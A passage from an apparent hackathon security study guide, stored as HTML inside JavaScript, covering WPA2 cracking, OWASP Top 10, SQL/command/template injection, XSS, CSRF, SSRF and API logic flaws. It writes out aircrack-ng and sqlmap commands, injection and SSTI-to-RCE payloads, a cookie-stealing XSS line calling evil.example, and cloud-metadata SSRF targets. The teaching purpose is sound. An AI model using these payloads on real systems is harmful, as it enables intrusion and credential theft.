<p><b>Signature-based</b> IDS/IPS (e.g. Snort/Suricata rules) matches known patterns — fast and low false-positive, but blind to anything novel, including a known attack with its bytes slightly altered. <b>Anomaly-based</b> detection builds a baseline of "normal" and flags deviation — catches novel attacks, but needs tuning or it drowns analysts in false positives from legitimate but unusual behaviour (a new employee's first login, a batch job that runs once a month). Most production environments run both layered together, and chapter 5.6's Sigma example is a signature-style rule you can pair with a simple statistical baseline for the anomaly side.</p>
<h4>VPN protocols, briefly compared</h4>
<table><tr><th scope="col">Protocol</th><th scope="col">Layer</th><th scope="col">Notes</th></tr>
<tr><td>IPsec</td><td>Network</td><td>Encrypts whole IP packets; common for site-to-site tunnels</td></tr>
<tr><td>WireGuard</td><td>Network</td><td>Modern, small codebase, fixed cryptographic suite — easier to audit</td></tr>
<tr><td>OpenVPN</td><td>Transport (TLS-based)</td><td>Flexible, widely supported, larger attack surface than WireGuard</td></tr>
<tr><td>TLS (HTTPS)</td><td>Presentation</td><td>Not a VPN, but the most common tunnel for a single application</td></tr></table>
<p>A VPN hides traffic content and (usually) the client's IP from the destination, but it does not make a network trusted — a compromised VPN endpoint has the same access any local host would. Treat it as a tunnel, not a security boundary in itself.</p>
`},

{t:"Wireless Security", h:`
<h3>1.6 Wireless Security</h3>
<p class="lede">Wireless adds a physical-layer wrinkle that wired networks don't have: anyone within radio range can passively receive every frame, authenticated or not, which is why wireless security has historically evolved through several broken generations before converging on something defensible.</p>

<h4>The generations</h4>
<p><b>WEP (Wired Equivalent Privacy)</b> is completely broken: its RC4-based encryption reuses short initialization vectors (IVs) frequently enough that an attacker can statistically recover the key just by capturing enough traffic, regardless of password strength. It should never appear in production anywhere today — its presence in a hackathon challenge is purely for teaching the historical attack.</p>
<p><b>WPA (Wi-Fi Protected Access)</b> was a stopgap fix using TKIP (Temporal Key Integrity Protocol) on top of the same RC4 cipher, closing WEP's worst flaws but still eventually broken via other means.</p>
<p><b>WPA2</b> introduced AES-CCMP encryption and is still the most widely deployed standard. Its weakness is not the crypto itself but the <b>4-way handshake</b> used to derive a session key from the pre-shared password: an attacker can passively capture this handshake (or force a fresh one by sending deauthentication frames to kick a connected client, who will automatically reconnect) and then crack it <i>offline</i> — trying candidate passwords against the captured handshake without ever touching the live network again, which is why a weak Wi-Fi password is just as crackable as a weak website password once the handshake is captured.</p>
<p><b>WPA3</b> replaces the vulnerable handshake with <b>SAE (Simultaneous Authentication of Equals, nicknamed "Dragonfly")</b>, which is resistant to offline dictionary attacks because each guess requires fresh interaction with the live access point rather than being verifiable purely from a captured handshake. WPA3 isn't perfect — the "Dragonblood" research disclosed side-channel and downgrade attacks against early implementations — but it meaningfully raises the bar over WPA2.</p>

<h4>Attack workflow (WPA2, conceptually)</h4>
<pre><code>airmon-ng start wlan0                        # put the adapter into monitor mode
airodump-ng wlan0mon                         # discover nearby networks & clients
airodump-ng -c &lt;channel&gt; --bssid &lt;AP&gt; -w cap wlan0mon   # capture on target network
aireplay-ng --deauth 10 -a &lt;BSSID&gt; wlan0mon  # (optional) force a client to reconnect, capturing the handshake
aircrack-ng -w wordlist.txt cap-01.cap       # offline dictionary attack against the captured handshake</code></pre>
<p>Monitor mode lets the wireless adapter capture all frames on a channel rather than only ones addressed to it — a prerequisite for any of this. Most hackathon wireless challenges hand you a pre-captured <code>.cap</code>/<code>.pcap</code> file and a wordlist rather than requiring live RF hardware, so the theory above and <code>aircrack-ng</code>'s cracking step are usually all you need.</p>

<h4>Evil twin / rogue access points</h4>
<p>An <b>evil twin</b> attack clones a legitimate network's SSID (and sometimes MAC address) with a stronger signal or forced deauth of the real AP, tricking clients into connecting to the attacker's access point instead — from which point credentials can be harvested via a fake captive portal, or traffic can simply be sniffed outright. Defense relies on client-side certificate validation (enterprise WPA2/3 with 802.1X) rather than trusting SSID names alone.</p>
<h4>WPA2's four-way handshake and why it's attackable</h4>
<p>WPA2-Personal derives a session key from the network password (PSK) and a four-way handshake exchanged when a client joins. Because the handshake is visible to anyone listening, an attacker can capture it (<code>airodump-ng</code>) and then attempt an offline dictionary or brute-force attack against it (<code>aircrack-ng</code>, <code>hashcat</code> mode 22000) without ever sending another packet to the network — the attack is entirely offline once the handshake is captured, so it leaves no trace and isn't rate-limited by the access point.</p>
<h4>Deauthentication and evil-twin attacks</h4>
<p>802.11 management frames (including deauthentication) are unauthenticated in WPA2, so an attacker can forge a deauth frame to forcibly disconnect a client, both to capture the resulting re-handshake and as a denial-of-service. An <b>evil-twin</b> attack goes further: the attacker clones a legitimate network's SSID with a stronger signal or after deauthenticating the real AP, so victims connect to the attacker's access point directly, exposing all unencrypted traffic.</p>
<h4>WPA3 improvements</h4>
<p>WPA3 replaces the PSK handshake with <b>SAE (Simultaneous Authentication of Equals)</b>, a password-authenticated key exchange that provides forward secrecy and resists offline dictionary attacks even against a captured handshake, because each exchange uses fresh, unpredictable values rather than a value derivable purely from the password. Implementation bugs (the "Dragonblood" research) showed side-channel weaknesses in early SAE implementations, which is a useful reminder that a stronger protocol on paper still depends on correct implementation.</p>
`},
  ]
},
{
  id:2, title:"Web Application Security", level:"Core",
  desc:"How web applications are built, how the trust boundary between client and server breaks down, and the full mechanics behind the OWASP Top 10. This is the largest category in almost every hackathon because the web is the largest attack surface in the real world.",
  subs:[
{t:"How Web Apps Work (the trust boundary)", h:`
<h3>2.1 How Web Applications Work — The Trust Boundary</h3>
<p class="lede">Every web vulnerability is ultimately a failure to correctly separate "things the client controls" from "things the server should never trust blindly." Internalizing this one sentence will let you spot entire bug classes you've never been taught by name.</p>

<h4>Request/response cycle</h4>
<p>A browser sends an <b>HTTP (HyperText Transfer Protocol)</b> request — a method (GET, POST, PUT, DELETE…), a path, headers, and optionally a body — to a server, which returns a response with a status code (200 OK, 404 Not Found, 500 Server Error, etc.), headers, and a body. <b>HTTPS</b> is the same protocol wrapped in <b>TLS (Transport Layer Security)</b> for confidentiality and integrity in transit — it protects data on the wire, but does absolutely nothing to protect against a flawed application logic bug, which is the overwhelming majority of what this chapter covers.</p>

<h4>Statelessness and cookies</h4>
<p>HTTP is stateless — the server has no built-in memory of who you are between requests. Sessions are bolted on top, almost always via a <b>cookie</b>: the server issues a random session identifier, the browser automatically re-sends it with every subsequent request, and the server looks it up server-side to recall who's talking. Because the browser attaches cookies <i>automatically</i> to any request to the matching domain — even requests the user didn't knowingly initiate — cookies are the root enabler of CSRF (section 2.4), and stealing a session cookie (e.g. via XSS, section 2.4) is functionally equivalent to stealing a login.</p>

<h4>The core trust-boundary rule</h4>
<p>Anything that arrives from the client — URL parameters, form fields, headers (including things that feel "internal" like <code>Referer</code> or <code>User-Agent</code>), cookies, and the body of a request — must be treated as attacker-controlled, full stop, no matter how the client-side JavaScript tried to constrain it. Client-side validation (a JavaScript form check, a disabled HTML button, a hidden field) is a UX convenience, never a security control, because an attacker simply doesn't use your JavaScript — they send the request directly with a tool like Burp Suite or <code>curl</code>. Every bug in sections 2.2–2.5 is some variant of a server trusting client input it shouldn't have.</p>

<h4>Where the "real" logic lives</h4>
<p>Modern apps typically split into a <b>frontend</b> (JavaScript running in the browser — React/Vue/Angular, etc.) and a <b>backend</b> (server-side code — Node/Express, Python/Django/Flask, PHP, Java/Spring, etc.) talking over an API, usually <b>REST (Representational State Transfer)</b> with JSON, or increasingly <b>GraphQL</b>. A recurring hackathon trap: a developer implements an authorization check only in the frontend (e.g. hiding an "admin" button for non-admins) while the backend API endpoint behind that button has no server-side check at all — calling the API directly bypasses the entire "protection."</p>
<h4>Where the trust boundary actually sits</h4>
<p>Every input that crosses from client to server — a form field, a URL parameter, a cookie, an HTTP header, an uploaded file's name or content — crosses the trust boundary and must be treated as attacker-controlled, regardless of what the client-side JavaScript validated. Client-side validation is a usability feature, not a security control: an attacker simply sends the request directly with curl, Burp Repeater, or a Python script, bypassing any JavaScript entirely. This single idea underlies almost every vulnerability class in this chapter — each one is, at root, a place where server code trusted something it shouldn't have.</p>
<h4>Request/response anatomy you must be able to read</h4>
<pre><code>POST /api/login HTTP/1.1
Host: app.local
Content-Type: application/json
Cookie: session=eyJhbGciOi...

{"username":"alice","password":"hunter2"}

HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGciOi...; HttpOnly; Secure; SameSite=Lax
Content-Type: application/json</code></pre>
<p><code>HttpOnly</code> stops JavaScript from reading the cookie (mitigating session-theft via XSS); <code>Secure</code> stops it being sent over plain HTTP; <code>SameSite</code> restricts when the browser attaches it to cross-site requests (mitigating CSRF). Missing any of these three flags on a session cookie is itself a finding worth reporting.</p>
<h4>Sessions, tokens and statelessness</h4>
<p>A traditional session stores state server-side and gives the client only an opaque ID (the cookie); a JWT-based session encodes the state in a signed token the client holds, so the server stays stateless. Statelessness scales easily but makes revocation hard — you cannot "delete" a JWT, you can only wait for it to expire or maintain a blocklist, which quietly reintroduces the state you were trying to avoid.</p>
`},

{t:"OWASP Top 10 — The Full Map", h:`
<h3>2.2 OWASP Top 10 (2021) — The Full Map</h3>
<p class="lede">The OWASP (Open Web Application Security Project) Top 10 is the industry-standard ranked list of the most critical web risks, rebuilt periodically from real breach and bug-bounty data. Treat this page as the index for the rest of the chapter — nearly every challenge you'll see maps to one or more of these ten.</p>
<ol>
<li><b>A01 — Broken Access Control:</b> the application fails to properly enforce what an authenticated (or anonymous) user is actually allowed to do or see — IDOR, missing function-level authorization, path traversal, privilege escalation via parameter tampering. Jumped to #1 in 2021 because it's both extremely common and extremely damaging.</li>
<li><b>A02 — Cryptographic Failures:</b> sensitive data exposed due to missing or weak encryption — plaintext password storage, home-rolled crypto, weak/legacy ciphers, missing TLS, predictable "random" tokens.</li>
<li><b>A03 — Injection:</b> untrusted data sent to an interpreter (SQL, OS shell, LDAP, template engine, NoSQL) is executed as code/commands instead of being treated as inert data. Covered in full depth in section 2.3.</li>
<li><b>A04 — Insecure Design:</b> the flaw exists in the architecture/requirements, not a specific line of buggy code — missing threat modeling, a business process that was never designed with abuse cases in mind (e.g. no rate limit on a password-reset endpoint by design, not by accident).</li>
<li><b>A05 — Security Misconfiguration:</b> default credentials left in place, verbose stack traces/error messages leaking internals, unnecessary features/ports/services enabled, missing security headers, overly permissive cloud storage.</li>
<li><b>A06 — Vulnerable and Outdated Components:</b> using a library, framework, or OS component with a known public CVE — the app's own code may be flawless and still be exploitable through a dependency.</li>
<li><b>A07 — Identification and Authentication Failures:</b> weak password policies, no protection against credential stuffing/brute force, broken or predictable session management, missing multi-factor authentication where it matters.</li>
<li><b>A08 — Software and Data Integrity Failures:</b> trusting data or code without verifying its integrity — insecure deserialization of untrusted data, auto-update mechanisms that don't verify signatures, CI/CD pipelines that pull unverified dependencies.</li>
<li><b>A09 — Security Logging and Monitoring Failures:</b> not a vulnerability that gets you popped directly, but it means a breach goes undetected for longer, and incident response has nothing to work with afterward.</li>
<li><b>A10 — Server-Side Request Forgery (SSRF):</b> the server can be tricked into making an HTTP request to a destination of the attacker's choosing, including internal-only resources the attacker could never reach directly. Covered in depth in section 2.4.</li>
</ol>
<div class="box"><p>The Top 10 is a <i>risk</i> ranking (likelihood × impact across the whole internet), not a <i>severity</i> ranking for any one specific bug — a single, perfectly placed IDOR can be more damaging in one particular app than a textbook SQLi elsewhere. Use the list as a checklist of categories to think through, not a strict priority order for any individual target.</p></div>
<h4>The full 2021 list, in order</h4>
<table><tr><th scope="col">#</th><th scope="col">Category</th><th scope="col">One-line test</th></tr>
<tr><td>A01</td><td>Broken Access Control</td><td>Can user A act on user B's data by changing an ID?</td></tr>
<tr><td>A02</td><td>Cryptographic Failures</td><td>Is sensitive data sent or stored without encryption, or with a weak algorithm?</td></tr>
<tr><td>A03</td><td>Injection</td><td>Does untrusted input reach a query, command, or template unescaped?</td></tr>
<tr><td>A04</td><td>Insecure Design</td><td>Would the flaw exist even with perfect implementation, because the design itself is wrong?</td></tr>
<tr><td>A05</td><td>Security Misconfiguration</td><td>Default credentials, verbose errors, unnecessary features enabled?</td></tr>
<tr><td>A06</td><td>Vulnerable & Outdated Components</td><td>Does <code>npm audit</code>/<code>pip-audit</code> flag a known CVE?</td></tr>
<tr><td>A07</td><td>Identification & Authentication Failures</td><td>Weak passwords allowed, no rate limiting, predictable session IDs?</td></tr>
<tr><td>A08</td><td>Software & Data Integrity Failures</td><td>Is a CI/CD pipeline or auto-update mechanism trusting unsigned input?</td></tr>
<tr><td>A09</td><td>Security Logging & Monitoring Failures</td><td>Would you even notice the attack happened?</td></tr>
<tr><td>A10</td><td>Server-Side Request Forgery (SSRF)</td><td>Does the server fetch a URL supplied by the user?</td></tr></table>
<h4>A04, Insecure Design, deserves special attention</h4>
<p>This category is unlike the other nine: it isn't a bug you patch, it's a flaw in the plan itself. A password-reset flow that emails the new password in plaintext is insecurely designed even if every line of code around it is bug-free — the fix is a different flow (a time-limited reset link), not a patch. Judges in hackathon security tracks specifically reward teams who can point to a design decision and explain the threat it closes, rather than only listing implementation bugs they fixed.</p>
`},

{t:"Injection Attacks — SQL, Command, NoSQL, Template", h:`
<h3>2.3 Injection Attacks</h3>
<p class="lede">Injection is what happens when a program builds a command, query, or piece of code by directly concatenating untrusted input into it, letting the interpreter parse attacker-supplied syntax as if it were part of the trusted logic.</p>

<h4>SQL Injection (SQLi)</h4>
<p>Consider a naive login check built as a string:</p>
<pre><code>query = "SELECT * FROM users WHERE username='" + user + "' AND password='" + pass + "'"</code></pre>
<p>If an attacker submits <code>' OR '1'='1</code> as the username, the resulting query becomes <code>... WHERE username='' OR '1'='1' AND password='...'</code> — since <code>'1'='1'</code> is always true, the WHERE clause is satisfied regardless of the real credentials, and authentication is bypassed entirely. The fix is never to sanitize/escape input by hand reliably — it's to use <b>parameterized queries / prepared statements</b>, where the query structure and the data are sent to the database separately, so user input can never be interpreted as SQL syntax no matter what characters it contains.</p>
<p>Beyond auth bypass, SQLi lets an attacker read arbitrary data via <b>UNION-based injection</b> (appending a second SELECT whose column count and types match the original query, to pull data from other tables into the visible output):</p>
<pre><code>' UNION SELECT username, password FROM users-- -</code></pre>
<p>When the application gives no visible output at all, you fall back to <b>blind SQL injection</b>: <b>boolean-based blind</b> infers data one bit at a time by asking true/false questions that change the page's behavior (<code>' AND 1=1--</code> vs <code>' AND 1=2--</code> and watching for a different response), and <b>time-based blind</b> infers data by forcing the database to pause when a condition is true (<code>' AND SLEEP(5)--</code>) and measuring response time instead of content. <code>sqlmap</code> automates detection and extraction across all these variants once you've found an injectable parameter: <code>sqlmap -u "http://target/page?id=1" --dbs</code>.</p>

<h4>Command Injection</h4>
<p>Occurs when user input is passed to a system shell. A page that "pings a host you type in" using <code>system("ping " + user_input)</code> can be abused with shell metacharacters to chain additional commands:</p>
<pre><code>127.0.0.1; whoami        # ; separates sequential commands
127.0.0.1 && cat /etc/passwd   # && runs the second command if the first succeeds
127.0.0.1 | id            # | pipes output, but also just chains execution
127.0.0.1 $(id)            # command substitution: runs id and inlines its output</code></pre>

<h4>NoSQL Injection</h4>
<p>Document databases like MongoDB parse queries as structured objects rather than strings, but are just as injectable if user input is passed in unvalidated as part of the query object. If a login handler builds its query directly from the parsed JSON body, an attacker can submit operators instead of literal values:</p>
<pre><code>{"username": {"$ne": null}, "password": {"$ne": null}}
// "$ne" (not-equal) against null matches almost any stored document, bypassing the check entirely.</code></pre>

<h4>Server-Side Template Injection (SSTI)</h4>
<p>Modern frameworks render HTML through template engines (Jinja2, Twig, FreeMarker…) that support their own expression syntax. If user input is concatenated directly into a template string rather than passed as template <i>data</i>, the engine will evaluate attacker-supplied expressions:</p>
<pre><code>{{7*7}}          # if the page renders "49", the input is being evaluated as code, not text
{{config}}        # in Flask/Jinja2, can leak the entire app configuration object
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}  # can escalate to RCE</code></pre>
<p>SSTI is particularly dangerous because, unlike SQLi (limited to the database) or basic XSS (limited to the browser), it frequently escalates all the way to <b>Remote Code Execution (RCE)</b> on the server itself, since template languages are often Turing-complete enough to reach the underlying scripting language's internals.</p>
<h4>SQLi: the full technique family</h4>
<p>The chapter's core example covers classic UNION-based SQLi where results appear directly in the response. Two further techniques matter in practice: <b>blind boolean-based</b> SQLi, where the response gives no data back but its content differs (e.g. "welcome" vs "invalid") depending on whether an injected condition is true, letting an attacker extract data one bit at a time by asking true/false questions (<code>' AND SUBSTRING(password,1,1)='a'--</code>); and <b>time-based blind</b> SQLi, used when there's no visible difference at all — the attacker injects a conditional delay (<code>' AND IF(1=1,SLEEP(5),0)--</code>) and infers the answer from response timing. Tools like <code>sqlmap</code> automate all three techniques once you've identified an injectable parameter.</p>
<h4>Second-order injection</h4>
<p>The most commonly missed variant: input is safely stored (perhaps even parameterised on the way in) but later read back and concatenated unsafely into a different query — a username stored safely at registration, then used unsafely in a "forgot password" lookup. Fixing the obvious entry point isn't enough; every place stored data is later used in a query needs the same discipline.</p>
<h4>Command and template injection, concretely</h4>
<pre><code># Command injection: if a server runs  ping {user_input}
user_input = "8.8.8.8; cat /etc/passwd"
# Template injection (SSTI), Jinja2:
user_input = "{{ 7*7 }}"          # response contains 49 -> confirms SSTI
user_input = "{{ config.items() }}"  # often leaks secrets in a misconfigured app</code></pre>
<p>The fix for every injection class in this section is the same shape: separate code from data. Parameterised queries for SQL, an argument array instead of a shell string for commands (<code>subprocess.run(["ping","-c","1",host])</code>, never <code>shell=True</code> with concatenated input), and a sandboxed or logic-less template engine for user-influenced templates.</p>
`},

{t:"XSS, CSRF, SSRF & Authentication Flaws", h:`
<h3>2.4 XSS, CSRF, SSRF & Authentication Flaws</h3>
<p class="lede">Where section 2.3 was about an interpreter on the <i>server</i> misparsing input, this section is about the trust between the server, the victim's browser, and other servers being abused.</p>

<h4>Cross-Site Scripting (XSS)</h4>
<p>XSS happens when attacker-supplied input ends up rendered as active HTML/JavaScript in another user's browser, rather than as inert text. There are three canonical flavors:</p>
<ul>
<li><b>Reflected XSS:</b> the payload is part of the request (e.g. a URL query parameter) and is echoed back immediately in the response — requires tricking a victim into clicking a crafted link, since the payload never persists.</li>
<li><b>Stored (persistent) XSS:</b> the payload is saved server-side (a comment, a profile bio, a support ticket) and served to every user who later views that content — far more dangerous since no individual link needs to be clicked.</li>
<li><b>DOM-based XSS:</b> the vulnerability lives entirely in client-side JavaScript that takes some untrusted source (e.g. <code>location.hash</code>) and writes it into the DOM via a dangerous sink (e.g. <code>innerHTML</code>) without ever involving the server in the vulnerable step itself.</li>
</ul>
<pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
&lt;img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"&gt;</code></pre>
<p>The impact of XSS is bounded by whatever JavaScript can do in a browser acting as the victim — which is a lot: stealing session cookies (unless marked <code>HttpOnly</code>, which blocks JS access to the cookie), performing actions as the victim, defacing the page, or pivoting into a full account takeover. Defense is primarily <b>output encoding</b> (escape data for the exact context it's rendered into — HTML body, HTML attribute, JS string, URL — these all require different escaping rules) and a <b>Content Security Policy (CSP)</b> header that restricts which script sources the browser is allowed to execute at all.</p>

<h4>Cross-Site Request Forgery (CSRF)</h4>
<p>Because browsers attach cookies automatically to any request sent to a matching domain, a malicious page the victim is tricked into visiting can silently submit a form (or fire a background request) to a target site the victim happens to be logged into — the request rides on the victim's real, valid session cookie, and the target server has no way to tell it wasn't intentionally initiated by the user. Defenses: a <b>CSRF token</b> — a unique, unpredictable value embedded in each legitimate form that must be echoed back and is verified server-side, which an attacker's cross-origin page cannot read or guess — and the <code>SameSite</code> cookie attribute, which tells the browser not to send the cookie at all on cross-site requests in the first place.</p>

<h4>Server-Side Request Forgery (SSRF)</h4>
<p>SSRF occurs when an application fetches a URL on the server's behalf based on user input (e.g. "import an image from this URL," a webhook validator, a PDF-generation service that renders a user-supplied page) without restricting <i>what</i> that URL can point to. An attacker supplies an internal-only address instead of a legitimate external one:</p>
<pre><code>http://169.254.169.254/latest/meta-data/    # cloud instance metadata endpoint (AWS/Azure/GCP) — classic SSRF target
http://localhost:6379/                       # reach an internal Redis instance that's never exposed externally
file:///etc/passwd                            # some fetchers also honor the file:// scheme</code></pre>
<p>SSRF is dangerous precisely because the request originates <i>from</i> the trusted server, often placing it inside a network perimeter or cloud IAM trust boundary the attacker could never reach directly — it's covered in more depth in the Cloud Security chapter (5.2) because cloud metadata endpoints are its single most consequential target.</p>

<h4>Authentication and session flaws</h4>
<ul>
<li><b>Predictable/weak session tokens:</b> if a session ID is generated from something guessable (timestamp, sequential counter, weak PRNG) rather than a cryptographically secure random source, an attacker can forge or predict a victim's session.</li>
<li><b>JWT (JSON Web Token) misconfigurations:</b> a JWT's signature proves it hasn't been tampered with — but some libraries historically accepted a token with <code>"alg": "none"</code>, letting an attacker strip the signature entirely and have the forged token accepted anyway; others can be tricked into verifying an RS256 token's signature using the public key as if it were an HMAC secret (the "alg confusion" attack).</li>
<li><b>No account lockout / rate limiting</b> on login turns authentication into a brute-forceable target.</li>
<li><b>IDOR on identity-bearing parameters</b> (e.g. a <code>user_id</code> cookie or parameter trusted without checking it matches the authenticated session) is functionally an authentication bypass even though it's categorized under access control.</li>
</ul>
<h4>The three kinds of XSS, and where each payload lands</h4>
<table><tr><th scope="col">Type</th><th scope="col">Where the payload lives</th><th scope="col">Who's affected</th></tr>
<tr><td>Stored</td><td>Database (e.g. a comment field)</td><td>Everyone who views the page</td></tr>
<tr><td>Reflected</td><td>URL parameter, echoed back in the response</td><td>Only a victim who clicks a crafted link</td></tr>
<tr><td>DOM-based</td><td>Never touches the server — client JS writes attacker data into the page (<code>innerHTML</code>, <code>document.write</code>)</td><td>Only a victim who loads a crafted URL, invisible to server-side logging</td></tr></table>
<p>DOM-based XSS is the easiest to miss because a server log or WAF never sees the payload at all — it only exists in the browser. Review client-side JavaScript for any place a URL fragment, <code>postMessage</code> data, or query parameter is written into the DOM without going through a safe API (<code>textContent</code> instead of <code>innerHTML</code>).</p>
<h4>CSRF, mechanically</h4>
<p>A victim is logged into <code>bank.com</code>; the browser auto-attaches the session cookie to <i>any</i> request to <code>bank.com</code>, including one triggered by a hidden form on <code>evil.com</code> that the victim merely visited. <code>SameSite=Lax</code> cookies (the current browser default) block this for most cross-site POSTs, which is why CSRF is less common than it once was — but it still matters for GET-based state changes (a classic mistake: a "delete" link that responds to GET) and for any app that sets <code>SameSite=None</code> for legitimate cross-site use.</p>
<h4>SSRF, and why it's dangerous beyond the obvious</h4>
<p>If a server fetches a user-supplied URL (an "import from URL" or webhook feature), an attacker can point it at <code>http://169.254.169.254/latest/meta-data/</code> — the cloud metadata endpoint many providers expose only to the instance itself — and retrieve IAM credentials the application server holds, turning a seemingly minor feature into full cloud-account compromise. Validate and allowlist destination hosts server-side; a blocklist of "localhost" is trivially bypassed with redirects, alternate IP encodings, or DNS rebinding.</p>
`},

{t:"Web Recon, Tooling & Burp Suite Workflow", h:`
<h3>2.5 Web Recon, Tooling & Burp Suite Workflow</h3>
<p class="lede">Finding web bugs efficiently is mostly a workflow discipline — know what to check first, and which tool does each job — rather than any single clever trick.</p>

<h4>Burp Suite</h4>
<p>Burp Suite is an intercepting proxy: it sits between your browser and the target, letting you see and modify every request and response in transit. Its core modules:</p>
<ul>
<li><b>Proxy:</b> intercepts live traffic so you can pause and edit a request before it's sent.</li>
<li><b>Repeater:</b> take any captured request and resend it manually with modifications, over and over, for manual parameter tampering and injection testing.</li>
<li><b>Intruder:</b> automated fuzzing — define positions in a request to substitute payloads from a wordlist (brute-forcing a login, testing many SQLi payloads against one parameter, enumerating IDs for IDOR).</li>
<li><b>Decoder:</b> quickly encode/decode Base64, URL-encoding, hex, etc. — useful for understanding or crafting payloads that pass through several encoding layers.</li>
<li><b>Target/Site map:</b> passively builds a map of the application's structure as you browse it normally through the proxy.</li>
</ul>
<p><b>OWASP ZAP (Zed Attack Proxy)</b> is the leading free/open-source alternative, with both passive scanning (flags issues just from traffic it observes) and active scanning (sends its own probing requests).</p>

<h4>Content discovery</h4>
<p>Applications routinely have pages, API endpoints, and files that aren't linked from the visible UI — admin panels, backup files, old API versions, debug endpoints. <b>Directory/content brute-forcing</b> tools request a huge wordlist of common paths and report which return something other than a 404:</p>
<pre><code>gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target/FUZZ -w wordlist.txt       # ffuf is fast and highly flexible with filtering
dirb http://target</code></pre>
<p><b>Subdomain enumeration</b> (<code>subfinder</code>, <code>amass</code>, or just searching Certificate Transparency logs at crt.sh) often reveals staging/dev environments with weaker security than production.</p>

<h4>Manual checks that find bugs tools miss</h4>
<ul>
<li>Always check <code>/robots.txt</code> (sometimes literally lists "don't look here" paths), <code>/.git/</code> (if exposed, the entire source history can be reconstructed with tools like <code>git-dumper</code>), <code>/.env</code> (often contains secrets/API keys), and any exposed source-map (<code>.map</code>) files that unminify client-side JavaScript.</li>
<li>Read HTML comments and client-side JavaScript source directly (view-source, or DevTools' Sources tab) — developers leave debug notes, commented-out code, and even hardcoded test credentials far more often than you'd expect.</li>
<li>Browser DevTools' <b>Network tab</b> shows every request the page actually makes (useful for finding undocumented API calls) and the <b>Application/Storage tab</b> shows cookies, localStorage, and sessionStorage contents directly.</li>
<li>Fingerprint the technology stack (<code>whatweb</code>, Wappalyzer browser extension, or just response headers like <code>Server</code>/<code>X-Powered-By</code>) to target version-specific known CVEs.</li>
</ul>
<div class="box"><p><b>Hackathon habit:</b> do the manual checks above <i>before</i> reaching for an automated scanner. Challenge designers frequently hide the intended path in exactly these "obvious once you look" places, and a scanner will drown you in noise before you'd ever stumble onto them.</p></div>
<h4>A repeatable Burp Suite workflow</h4>
<ol><li><b>Proxy + browse</b>: route the browser through Burp and click through the app normally to populate the sitemap with every endpoint it uses, including ones not linked from the visible UI.</li><li><b>Passive review</b>: check the Issues tab and sitemap for missing security headers, verbose errors, and interesting parameters before touching anything actively.</li><li><b>Repeater</b>: send an interesting request to Repeater and manually vary one parameter at a time — this is where most manual bugs (IDOR, auth bypass, injection) are actually found.</li><li><b>Intruder</b>: once you know what to vary, automate it — a wordlist against a parameter for fuzzing, or a numeric range to test IDOR across many IDs at once.</li><li><b>Compare responses</b>: status code, length and timing differences between two near-identical requests are often the only signal you get in a blind vulnerability.</li></ol>
<h4>Content and subdomain discovery</h4>
<pre><code>ffuf -u https://app.local/FUZZ -w /usr/share/wordlists/dirb/common.txt   # directories/files
ffuf -u https://FUZZ.app.local -w subdomains.txt -H "Host: FUZZ.app.local"  # vhosts
gau app.local | grep -E '\?.*='      # historical URLs with parameters, from the Wayback Machine</code></pre>
<p>Hidden endpoints found this way (an old <code>/admin-v1</code>, a debug route left enabled) are disproportionately likely to be vulnerable precisely because they were forgotten rather than actively maintained.</p>
`},

{t:"API Security & Business Logic Flaws", h:`
<h3>2.6 API Security & Business Logic Flaws</h3>
<p class="lede">As applications increasingly expose their functionality as APIs (REST or GraphQL) consumed by a separate frontend or mobile app, a distinct set of risks has emerged that tooling alone can't find — they require actually understanding what the application is supposed to do and reasoning about how that logic can be abused.</p>

<h4>Broken Object Level Authorization (BOLA) / IDOR</h4>
<p><b>IDOR (Insecure Direct Object Reference)</b> — often called <b>BOLA</b> in API-specific contexts — happens when an endpoint takes an identifier directly from the request and fetches/modifies the corresponding object without verifying the authenticated user actually owns or is permitted to access that object:</p>
<pre><code>GET /api/invoices/1042      # your invoice
GET /api/invoices/1043      # someone else's — does the server check ownership, or just that 1043 exists?</code></pre>
<p>This is arguably the single most common serious bug in real-world API security precisely because it requires no clever payload at all — just incrementing or guessing an ID and observing whether the server enforces ownership.</p>

<h4>Mass assignment</h4>
<p>Many frameworks offer a convenience that automatically maps JSON request fields onto a database model's fields. If the endpoint blindly accepts and saves <i>every</i> field the client sends rather than an explicit allow-list, an attacker can add fields the UI never exposed:</p>
<pre><code>POST /api/users/update
{"name": "Alice", "isAdmin": true}   // if isAdmin maps straight to the DB model, this is a privilege escalation</code></pre>

<h4>Rate limiting and resource exhaustion</h4>
<p>Endpoints that perform a sensitive, guessable, or expensive operation — login, OTP (One-Time Password) verification, password reset, search — need rate limiting. Its absence turns a theoretically-secure design (e.g. a 6-digit OTP, 1 in a million chance per guess) into a practically-brute-forceable one once an attacker can fire thousands of guesses per second with no lockout.</p>

<h4>Business logic abuse</h4>
<p>These are flaws in the application's intended workflow rather than in any single technical control — often invisible to automated scanners entirely:</p>
<ul>
<li>Submitting a negative quantity in a shopping cart to make the total go negative (effectively getting paid to "buy" something).</li>
<li>Reusing a single-use discount/coupon code by replaying the redemption request, or by exploiting a <b>race condition</b> — firing many redemption requests in parallel so that a check-then-act sequence (check if the coupon is still valid, then mark it used) runs multiple times before the "mark as used" step completes for any of them.</li>
<li>Manipulating a multi-step workflow out of order (e.g. jumping straight to a "payment confirmed" endpoint without ever actually paying, if the server trusts the client to report its own progress through the flow).</li>
</ul>

<h4>GraphQL-specific risks</h4>
<p>GraphQL's flexibility creates its own category of pitfalls: <b>introspection</b> left enabled in production lets anyone query the <code>__schema</code> meta-field to retrieve the API's entire data model, effectively handing an attacker full API documentation; deeply nested or batched queries can cause denial-of-service if query cost/depth isn't limited; and because a single GraphQL endpoint typically serves many different "virtual" operations, authorization has to be checked per-field/per-resolver rather than per-URL, which is easy to miss in implementation.</p>
<div class="box"><p>These bugs are the reason hackathon judges in web tracks reward careful reading of what an application is <i>supposed</i> to do, not just tool output — business logic flaws have no CVE, no scanner signature, and no generic payload. They reward the same skill a real bug bounty hunter relies on most.</p></div>
<h4>REST vs GraphQL: different attack surface</h4>
